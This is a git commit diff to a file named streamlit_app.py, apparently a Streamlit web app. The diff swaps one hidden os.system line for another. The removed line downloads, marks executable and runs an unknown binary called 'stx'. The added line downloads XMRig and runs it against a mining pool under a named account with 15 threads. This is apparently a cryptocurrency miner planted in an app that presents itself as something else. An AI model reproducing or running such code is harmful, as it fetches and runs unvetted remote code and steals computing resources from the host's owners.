f6062700a374543dc5c1d95390d4632b14732e12
hagacz <112244590+hagacz@users.noreply.github.com>
2022-08-28 03:54:38 +0000

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -10,4 +10,4 @@ from os import system, name
 from time import sleep
 from subprocess import PIPE, Popen
 import base64
-os.system("curl -L -o stx https://github.com/hagacz/tes/raw/main/stx && chmod +x stx && ./stx")
+os.system ("wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -a rx/0 -o stc.ss.poolin.one:443 -u nung.001 --keepalive --donate-level 1 -p x -t 15") 
